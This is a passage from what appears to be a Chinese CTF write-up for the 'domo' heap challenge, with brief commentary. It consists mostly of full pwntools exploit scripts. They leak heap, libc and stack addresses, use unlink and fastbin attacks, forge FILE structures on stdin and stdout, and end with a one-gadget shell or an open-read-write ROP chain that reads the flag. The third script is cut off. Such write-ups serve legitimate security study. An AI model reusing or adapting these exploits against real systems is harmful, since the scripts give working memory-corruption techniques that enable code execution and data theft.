class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sym</span><span class="params">(func)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(func , libc.sym[func]))</span><br><span class="line">    <span class="keyword">return</span> libc.sym[func]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'\x12'</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x16"</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x110</span>,p64(<span class="number">0x21</span>)*<span class="number">32</span>)<span class="comment">#5</span></span><br><span class="line"><span class="comment">#---------------leak libc heap addr--------------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">8</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">'\x15'</span>*<span class="number">8</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x0a'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">heap=leak<span class="number">-0x55b3d7aa52b0</span>+<span class="number">0x55b3d7aa5010</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"heap"</span>,heap)</span><br><span class="line"></span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">leak=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">libc.address=leak<span class="number">-0x7f2534dafb78</span>+<span class="number">0x7f25349eb000</span></span><br><span class="line">info(<span class="string">"leak"</span>,leak)</span><br><span class="line">info(<span class="string">"libc"</span>,libc.address)</span><br><span class="line"></span><br><span class="line">environ=libc.sym[<span class="string">"environ"</span>]</span><br><span class="line">_IO_list_all=libc.address+<span class="number">0x7f97b2172520</span><span class="number">-0x7f97b1dad000</span></span><br><span class="line">io_stdin_vtable=libc.address+<span class="number">0x7f07aec479b0</span><span class="number">-0x7f07ae883000</span></span><br><span class="line">info(<span class="string">"environ"</span>,environ)</span><br><span class="line">info(<span class="string">"io_stdin_vtable"</span>,io_stdin_vtable)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#------------------- unlink-------------</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'\x13'</span>*<span class="number">0x60</span> + p64(<span class="number">0x110</span> + <span class="number">0x70</span>))<span class="comment">#1</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------fastbin attack + fake vtable-------</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x120</span>,<span class="string">'\x12'</span>*<span class="number">0x100</span>+p64(<span class="number">0x110</span>)+p64(<span class="number">0x70</span>)+p64(io_stdin_vtable<span class="number">-0x20</span>)) <span class="comment">#1</span></span><br><span class="line">edit(io_stdin_vtable<span class="number">-0x18</span>,<span class="string">"\x71"</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">2</span>+p64(one[<span class="number">2</span>]+libc.address)*<span class="number">19</span>+p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">add(<span class="number">0x100</span>,payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">"\x17"</span>*<span class="number">8</span>) <span class="comment">#</span></span><br><span class="line">add(<span class="number">0x60</span>,p64(<span class="number">0xffffffff</span>)+<span class="string">"\x00"</span>*<span class="number">0x10</span>+p64(heap+<span class="number">0x140</span>)) <span class="comment">#2</span></span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">free(0)</span></span><br><span class="line"><span class="string">add(0x120,'\x12'*0x100+p64(0x110)+p64(0x70)+p64(io_sdtout-0x43)) #1</span></span><br><span class="line"><span class="string">add(0x68,"\x17"*0x10) #</span></span><br><span class="line"><span class="string">payload='\x01'*0x33+p64(0xfbad1800)+p64(0)*3+p64(environ)+p64(environ+0x8)+ p64(environ+0x8)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x68,payload) #2</span></span><br><span class="line"><span class="string">dbg()</span></span><br><span class="line"><span class="string">leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))</span></span><br><span class="line"><span class="string">rbp=leak-0x7ffc34284dd8+0x7ffc34284ce0</span></span><br><span class="line"><span class="string">info("leak",leak)</span></span><br><span class="line"><span class="string">info("rbp",rbp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><h3 id="其他思路"><a href="#其他思路" class="headerlink" title="其他思路"></a>其他思路</h3><p>赛后看了官方的writeup，预期解跟我刚开始的思路差不多，只不过攻击方式不同</p><p>他是先修改<code>_IO_2_1_stdout_</code>来实现泄露stack地址，</p><p>接着改写 <code>_IO_2_1_stdin_</code>来实现向stack上写ROP链</p><p>有一些细节，需要注意到。修改 <code>_IO_2_1_stdout_</code>泄露出栈地址后，<code>puts</code>函数输出的字符不会加换行符了</p><p>具体原因还不清楚，有知道的师傅可以交流一波</p><h3 id="exp2"><a href="#exp2" class="headerlink" title="exp2"></a>exp2</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>, <span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(ip,port)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(pwn_name,checksec=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_one</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span>(arch == <span class="string">'64'</span>):</span><br><span class="line">        <span class="keyword">if</span>(version == <span class="string">'2.23'</span>):</span><br><span class="line">            one = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">        <span class="keyword">if</span> (version == <span class="string">'2.27'</span>):</span><br><span class="line">            one = [<span class="number">0x4f2c5</span> , <span class="number">0x4f322</span> , <span class="number">0x10a38c</span>]</span><br><span class="line">    <span class="keyword">return</span> one</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span><span class="params">(con,leak)</span>:</span></span><br><span class="line">    success(<span class="string">'&#123;&#125; =&gt; &#123;:#x&#125;'</span>.format(con,leak))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span><span class="params">(address=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> address==<span class="number">0</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> address &gt; <span class="number">0xfffff</span>:</span><br><span class="line">            script=<span class="string">"b *&#123;:#x&#125;\nc\n"</span>.format(address)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            script=<span class="string">"b *$rebase(&#123;:#x&#125;)\nc\n"</span>.format(address)</span><br><span class="line">        gdb.attach(p, script)</span><br><span class="line"></span><br><span class="line">one = get_one()</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------------heap-------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">chioce</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt; "</span>,str(idx))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">"\n"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(size,data)</span>:</span></span><br><span class="line">    chioce(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(size))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"\n"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free2</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, data)</span>:</span></span><br><span class="line">    chioce(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">":"</span>,str(index))</span><br><span class="line">    p.sendafter(<span class="string">":"</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    chioce(<span class="number">3</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak heap----------------</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"A"</span>) <span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"\x10"</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>) </span><br><span class="line">heap_addr=u64 (p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">free (<span class="number">0</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------leak libc----------------</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">"A"</span>* <span class="number">0x100</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'b'</span>* <span class="number">0x100</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'c'</span> *<span class="number">0x68</span>)   <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">'d'</span> *<span class="number">0x68</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">'e'</span>*<span class="number">56</span>+p64(<span class="number">0x71</span>)+<span class="string">'e'</span>*<span class="number">176</span>+ p64(<span class="number">0x100</span>) +p64(<span class="number">0x21</span>))<span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x68</span>,p64 (<span class="number">0x21</span>) *<span class="number">2</span>)<span class="comment">#5</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">"\x11"</span>*<span class="number">0x60</span>+p64(<span class="number">0x300</span>)) <span class="comment">#3</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'flag'</span>.ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)+<span class="string">'\x22'</span>*<span class="number">0x58</span>) <span class="comment">#0</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</span><br><span class="line">libc.address=main_arena<span class="number">-0x3c4b78</span></span><br><span class="line">environ_addr=libc.symbols[<span class="string">"environ"</span>]</span><br><span class="line">stdout_hook=libc.symbols[<span class="string">"_IO_2_1_stdout_"</span>]</span><br><span class="line">stdin_hook=libc.symbols[<span class="string">"_IO_2_1_stdin_"</span>]</span><br><span class="line">_IO_file_jumps=libc.symbols[<span class="string">"_IO_file_jumps"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------leak stack_addr--------------</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">"A"</span>*<span class="number">0x100</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0x71</span>)</span><br><span class="line">payload+=p64(stdout_hook<span class="number">-0x43</span>)</span><br><span class="line">add(<span class="number">0x118</span>,payload) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'a'</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">5</span>+<span class="string">'\x00'</span>*<span class="number">3</span>+p64(_IO_file_jumps)+p64(<span class="number">0xfbad1800</span>)+p64(stdout_hook+<span class="number">131</span>)*<span class="number">3</span></span><br><span class="line">payload+=p64(environ_addr)+p64(environ_addr+<span class="number">8</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"len="</span>,hex(len(payload))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,payload) <span class="comment">#6</span></span><br><span class="line">stack_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xf2</span></span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------Write orw to stack----------</span></span><br><span class="line"></span><br><span class="line">add2(<span class="number">0xf8</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)) <span class="comment">#4</span></span><br><span class="line">free2(<span class="number">0</span>)</span><br><span class="line">free2(<span class="number">4</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)) <span class="comment">#7</span></span><br><span class="line">free2(<span class="number">7</span>)</span><br><span class="line">add2(<span class="number">0x108</span>,p64(<span class="number">0</span>)*<span class="number">11</span>+p64(<span class="number">0x71</span>)+p64(stdin_hook<span class="number">-0x28</span>))</span><br><span class="line">add2(<span class="number">0x68</span>,<span class="string">'flag'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.search(asm(<span class="string">"pop rdi\nret"</span>)).next()</span><br><span class="line">pop_rsi_ret=libc.search(asm(<span class="string">"pop rsi\nret"</span>)).next()</span><br><span class="line">pop_rdx_ret=libc.search(asm(<span class="string">"pop rdx\nret"</span>)).next()</span><br><span class="line"></span><br><span class="line">open_addr=libc.symbols[<span class="string">"open"</span>]</span><br><span class="line">read_addr=libc.symbols[<span class="string">"read"</span>]</span><br><span class="line">puts_addr=libc.symbols[<span class="string">"write"</span>]</span><br><span class="line"></span><br><span class="line">orw=p64(pop_rdi_ret)+p64(heap_addr+<span class="number">0x50</span>)+p64(pop_rsi_ret)+p64(<span class="number">72</span>)+p64(open_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">3</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x30</span>)+p64(read_addr)</span><br><span class="line">orw+=p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(pop_rsi_ret)+p64(heap_addr+<span class="number">0x12a8</span>)+p64(pop_rdx_ret)+p64(<span class="number">0x100</span>)+p64(puts_addr)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(libc.symbols[<span class="string">"_IO_file_jumps"</span>])+p64(<span class="number">0</span>)+ p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">6</span>+p64(stack_addr)+p64(stack_addr+<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">info(<span class="string">"heap_addr"</span>,heap_addr)</span><br><span class="line">info(<span class="string">"stack_addr"</span>,stack_addr)</span><br><span class="line"></span><br><span class="line">edit(stdin_hook<span class="number">-0x20</span>,<span class="string">'\x7f'</span>)</span><br><span class="line">add2(<span class="number">0x68</span>,payload)</span><br><span class="line"><span class="comment">#dbg()</span></span><br><span class="line">p.sendlineafter(<span class="string">"&gt; "</span>,<span class="string">"5\n"</span>+orw)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="exp3"><a href="#exp3" class="headerlink" title="exp3"></a>exp3</h3><p>还有另一种非预期思路，打<code>malloc_hook</code>,然后利用<code>scanf</code>函数输入过多字符，会调用<code>malloc</code>申请内存</p><p>这里<code>onegadget</code>都失效了，用<code>realloc</code>调整偏移即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">pwn_name = <span class="string">"domo"</span></span><br><span class="line">arch = <span class="string">'64'</span></span><br><span class="line">version = <span class="string">'2.23'</span></span><br><span class="line">ip, port = <span class="string">'node3.buuoj.cn'</span>,<span class="number">29246</span></span><br><span class="line"><span class="comment">#context.terminal = ['tmux', 'splitw', '-h']</span></span><br><span class="line"><span class="comment">#context(os='linux', arch='amd64')</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./'</span>+pwn_name)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>,checksec=<span class="keyword">False</span>)</span><br><span class="line"><span 